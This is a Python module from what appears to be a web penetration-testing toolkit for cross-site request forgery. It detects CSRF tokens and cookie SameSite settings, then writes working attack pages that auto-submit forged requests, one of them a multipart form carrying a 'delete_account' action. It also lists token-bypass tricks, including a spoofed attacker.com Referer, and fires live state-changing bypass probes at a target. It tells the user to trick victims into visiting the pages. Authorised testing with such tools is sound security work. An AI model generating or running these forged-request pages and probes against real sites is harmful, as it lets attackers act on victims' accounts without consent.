"""
modules/csrf.py
tmrswrr - Cross-Site Request Forgery (CSRF)
Token detection, bypass techniques, PoC generator, SameSite analysis
"""
import os
import re

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_YEL,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    section,
    success,
    warn,
)
from utils.http import get_client, set_cookie_headers


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def detect_csrf_protection():
    section("CSRF PROTECTION DETECTION")
    url = _target()

    info("Analyzing pages and forms for CSRF token presence...")

    pages_to_check = [url, f"{url}/profile", f"{url}/settings",
                      f"{url}/account", f"{url}/user/settings"]

    found_tokens = []
    missing_tokens = []

    client = get_client()
    for page in pages_to_check:
        resp = client.safe_get(page, timeout=10)
        if resp is None:
            continue
        out = resp.text
        if len(out) < 100:
            continue

        # Check for CSRF token patterns
        token_patterns = [
            r'name=["\']_?csrf[_-]?token["\'][^>]*value=["\']([^"\']{8,})["\']',
            r'name=["\']csrf["\'][^>]*value=["\']([^"\']{8,})["\']',
            r'name=["\']_token["\'][^>]*value=["\']([^"\']{8,})["\']',
            r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']{8,})["\']',
            r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']{8,})["\']',
            r'"csrfToken"\s*:\s*"([^"]{8,})"',
            r'"csrf"\s*:\s*"([^"]{8,})"',
            r'X-CSRF-Token["\']?\s*:\s*["\']?([^"\'<>\s]{8,})',
            r'meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']{8,})["\']',
        ]

        page_short = page.replace(url, "")
        for pat in token_patterns:
            m = re.search(pat, out, re.I)
            if m:
                found_tokens.append((page_short or "/", m.group(1)[:20] + "..."))
                success(f"CSRF token found on {page_short or '/'}: {m.group(1)[:20]}...")
                break

        # Each POST form is judged on its own markup. Searching the whole page
        # for a token meant one protected form vouched for every other form on
        # it - and a token in a <meta> tag vouched for all of them.
        forms = re.findall(r"<form[^>]*method=[\"']post[\"'][^>]*>.*?</form>",
                           out, re.S | re.I)
        for form in forms:
            if any(re.search(pat, form, re.I) for pat in token_patterns):
                continue
            action = re.search(r"action=[\"']([^\"']*)[\"']", form, re.I)
            action_url = action.group(1) if action else page
            warn(f"POST form WITHOUT CSRF token: {page_short or '/'} → {action_url}")
            missing_tokens.append(page_short or "/")
            add_vuln("Missing CSRF Token on POST Form", "Medium", "A01:2021",
                     f"A POST form on {page} (action: {action_url}) carries no CSRF token. "
                     "Confirm the endpoint accepts the request cross-site - SameSite "
                     "cookies alone may already block it.",
                     page, evidence=resp.evidence, confidence="Tentative", cwe="CWE-352")

    # Check SameSite cookie attribute
    info("\nChecking SameSite cookie attribute...")
    # Set-Cookie is often only emitted on a real GET, not on HEAD.
    resp = client.safe_get(url, timeout=8)
    if resp is None:
        warn("Could not read cookies from the target")
        return missing_tokens

    for ck in set_cookie_headers(resp):
        name = ck.split("=", 1)[0].strip()
        lowered = ck.lower()
        if "samesite" in lowered:
            if "strict" in lowered:
                success(f"SameSite=Strict: {name}")
            elif "lax" in lowered:
                info(f"SameSite=Lax: {name}  (GET-based CSRF still possible)")
            elif "none" in lowered:
                warn(f"SameSite=None: {name}  (cross-site requests allowed)")
                add_vuln(f"SameSite=None Cookie: {name}", "Medium", "A05:2021",
                         f"Cookie '{name}' is sent on cross-site requests "
                         "(SameSite=None)", url, evidence=resp.evidence,
                         confidence="Confirmed", cwe="CWE-1275")
        else:
            # Modern browsers default to Lax, so a missing attribute is a
            # hardening gap rather than an exploitable state on its own - and
            # it only matters for cookies that carry authentication.
            session_like = any(k in name.lower() for k in
                               ("sess", "auth", "token", "sid", "login", "jwt"))
            warn(f"No SameSite attribute: {name}")
            add_vuln(f"Cookie Missing SameSite Attribute: {name}",
                     "Medium" if session_like else "Low", "A05:2021",
                     f"Cookie '{name}' has no SameSite attribute; browsers fall back to "
                     "their own default (Lax in current versions).",
                     url, evidence=resp.evidence, confidence="Confirmed", cwe="CWE-1275")

    return missing_tokens


def csrf_poc_generator():
    section("CSRF PoC GENERATOR")
    url = _target()
    cookies = SESSION.get("cookies", "")

    endpoint = prompt("Target endpoint (e.g. /account/email or /transfer)")
    method   = prompt("[1] POST  [2] GET  [3] PUT/PATCH") or "1"

    print(f"\n  {NEON_CYN}Form fields (Enter blank line when done):{RST}")
    fields = []
    while True:
        f = prompt("field=value (or Enter to finish)")
        if not f:
            break
        if "=" in f:
            k, _, v = f.partition("=")
            fields.append((k.strip(), v.strip()))

    method_str = {"1": "POST", "2": "GET", "3": "POST"}.get(method, "POST")

    # Build form fields HTML
    inputs_html = "\n    ".join(
        f'<input type="hidden" name="{k}" value="{v}">'
        for k, v in fields
    )
    if not inputs_html:
        inputs_html = '<!-- Add form fields here -->'

    # For PUT/PATCH - use fetch
    if method == "3":
        fetch_body = json_body = "{" + ", ".join(
            f'"{k}": "{v}"' for k, v in fields
        ) + "}"
        poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - {endpoint}</title></head>
<body>
<h3>CSRF PoC - PUT/PATCH via fetch()</h3>
<script>
// Auto-executes when victim visits this page
fetch('{url}{endpoint}', {{
  method: 'PUT',
  credentials: 'include',
  headers: {{'Content-Type': 'application/json'}},
  body: JSON.stringify({fetch_body})
}})
.then(r => r.text())
.then(t => document.body.innerHTML += '<pre>Response: ' + t + '</pre>')
.catch(e => document.body.innerHTML += '<pre>Error: ' + e + '</pre>');
</script>
<p>If the request succeeded, CSRF is confirmed.</p>
</body>
</html>"""
    else:
        poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - {endpoint}</title></head>
<body onload="document.forms[0].submit()">
<h3>CSRF PoC - {method_str} {url}{endpoint}</h3>
<p>This page auto-submits on load. In a real attack, the victim visits this page.</p>
<form action="{url}{endpoint}" method="{method_str}" style="display:none">
    {inputs_html}
    <input type="submit" value="Submit">
</form>
<noscript>
  <p>Click submit: <input type="submit" form="csrf-form" value="Click me"></p>
</noscript>
</body>
</html>"""

    out_file = _out("csrf_poc.html")
    with open(out_file, "w") as f:
        f.write(poc)
    success(f"CSRF PoC saved → {out_file}")
    info("Host this file and trick victim into visiting it")
    info(f"Preview: firefox {out_file}")
    print(f"\n{NEON_CYN}{poc[:600]}{RST}")


def csrf_bypass_techniques():
    section("CSRF TOKEN BYPASS TECHNIQUES")
    url = _target()

    print(f"""
  {NEON_CYN}CSRF Bypass Techniques to Test:{RST}

  {NEON_GRN}[1] Remove CSRF token entirely:{RST}
    Send the request without the csrf parameter at all
    Some implementations only validate IF token is present

  {NEON_GRN}[2] Use empty/null token:{RST}
    csrf_token=
    csrf_token=null
    csrf_token=undefined
    csrf_token=0

  {NEON_GRN}[3] Use token from another session:{RST}
    Swap your valid token into another user's request
    If accepted → tokens are not bound to sessions

  {NEON_GRN}[4] Change Content-Type to bypass referer check:{RST}
    POST with Content-Type: application/json
    POST with Content-Type: text/plain
    POST with Content-Type: application/x-www-form-urlencoded;charset=UTF-8

  {NEON_GRN}[5] Referer header manipulation:{RST}
    Add Referer: https://trusted.com/
    Remove Referer header entirely
    Use Referer: https://attacker.com?https://trusted.com/

  {NEON_GRN}[6] CSRF via XSS (bypasses all CSRF protection):{RST}
    If XSS is present, use it to extract CSRF token and make request

  {NEON_GRN}[7] JSON CSRF (if API accepts both JSON and form):{RST}
    <form enctype="text/plain" action="TARGET/api/action" method="POST">
    <input name='{"action":"delete","user_id":1}' value='x'>
""")

    endpoint = prompt("Endpoint to test bypass (e.g. /account/email)")
    if not endpoint:
        return

    field  = prompt("CSRF token field name (e.g. csrf_token)")

    target = url.rstrip("/") + "/" + endpoint.lstrip("/")
    probe = {"email": "yeepforge-csrf-probe@example.net"}
    bypass_tests = [
        ("No token",     {"data": probe, "headers": {}}),
        ("Empty token",  {"data": {**probe, field: ""}, "headers": {}}),
        ("Null token",   {"data": {**probe, field: "null"}, "headers": {}}),
        ("No Referer",   {"data": probe, "headers": {"Referer": ""}}),
        ("JSON content", {"json_body": probe, "headers": {"Content-Type": "application/json"}}),
    ]

    info(f"Testing {len(bypass_tests)} CSRF bypass variants on {target}...")
    warn("This sends real state-changing requests - only run it where you are authorised to.")
    print()

    client = get_client()
    for name, kwargs in bypass_tests:
        try:
            # One request per variant. The previous version issued each probe
            # twice (once for the body, once for the status code), doubling the
            # write attempts against the target.
            resp = client.post(target, timeout=10, **kwargs)
        except Exception as exc:
            print(f"  {DIM}[!] {name}: {exc}{RST}")
            continue

        code = resp.status_code
        if code in (200, 201, 204):
            success(f"BYPASS POSSIBLE: {name} → HTTP {code}")
            add_vuln(f"CSRF Bypass: {name}", "High", "A01:2021",
                     f"The endpoint accepted a state-changing POST with '{name}' "
                     f"(HTTP {code}). Confirm the action actually took effect - a 200 "
                     "may still be a rejection page.",
                     target, evidence=resp.evidence, confidence="Tentative", cwe="CWE-352")
        elif code in (403, 422, 419):
            print(f"  {DIM}[BLOCKED {code}] {name}{RST}")
        else:
            print(f"  {NEON_YEL}[{code}?]{RST} {name} - manual verification needed")


def csrf_via_file_upload():
    section("CSRF VIA FILE UPLOAD (JSON/multipart)")
    url = _target()

    print(f"""
  {NEON_CYN}Advanced CSRF via multipart/form-data:{RST}

  {NEON_GRN}Attack scenario:{RST}
    Most CSRF protections check Content-Type
    But multipart/form-data requests CAN be sent cross-origin via forms!

  {NEON_GRN}PoC HTML (multipart CSRF):{RST}
""")
    endpoint = prompt("Target upload/multipart endpoint")
    if endpoint:
        poc = f"""<!DOCTYPE html>
<html>
<body>
<!-- Multipart CSRF PoC - sends cross-origin multipart/form-data -->
<form id="csrf-form" action="{url}{endpoint}" method="POST"
      enctype="multipart/form-data">
  <input name="file" type="file">
  <input name="action" value="delete_account" type="hidden">
</form>
<script>
// Create a fake file blob
var dt = new DataTransfer();
dt.items.add(new File(['malicious content'], 'evil.txt', {{type:'text/plain'}}));
document.getElementById('csrf-form').elements['file'].files = dt.files;
document.getElementById('csrf-form').submit();
</script>
</body>
</html>"""
        out_file = _out("csrf_multipart_poc.html")
        with open(out_file, "w") as f:
            f.write(poc)
        success(f"Multipart CSRF PoC → {out_file}")


def run():
    print_banner("CROSS-SITE REQUEST FORGERY (CSRF)", "tmrswrr")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Detect CSRF Protection    {SOFT_WHITE}(token presence, SameSite, forms){RST}
  {NEON_CYN}[2]{RST} Generate CSRF PoC         {SOFT_WHITE}(HTML auto-submit, fetch, multipart){RST}
  {NEON_CYN}[3]{RST} Bypass Techniques         {SOFT_WHITE}(no token, empty, Referer, JSON){RST}
  {NEON_CYN}[4]{RST} CSRF via File Upload      {SOFT_WHITE}(multipart/form-data cross-origin){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": detect_csrf_protection()
        elif c == "2": csrf_poc_generator()
        elif c == "3": csrf_bypass_techniques()
        elif c == "4": csrf_via_file_upload()
        save_session()
